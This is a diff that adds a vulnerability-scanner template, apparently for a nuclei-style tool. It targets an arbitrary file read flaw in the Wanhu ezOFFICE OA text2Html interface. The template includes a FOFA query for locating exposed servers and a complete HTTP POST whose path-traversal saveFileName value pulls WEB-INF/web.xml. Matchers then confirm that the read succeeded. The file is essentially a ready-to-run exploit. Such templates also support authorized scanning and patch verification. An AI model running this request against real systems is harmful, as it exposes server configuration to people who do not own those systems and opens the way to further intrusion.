@@ -1,0 +1,26 @@
+## id: VEID-2024-0203
+## name: 万户OA text2Html接口存在任意文件读取漏洞
+## author: hack007x
+## severity: medium
+## tags: veid,file,veid2024
+## description:万户OA text2Html接口存在任意文件读取漏洞。
+## fofa-query: app="万户网络-ezOFFICE"
+## verification: true
+
+
+POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "/WEB-INF/struts-config" && body contains "http://www.w3.org"
+
+
+
+
+
+# @VEIL-STAMP: b23ba3a78e4a94bb9ee46c4aaba021e525b839868693a8f0bb24bda04caf0a2f
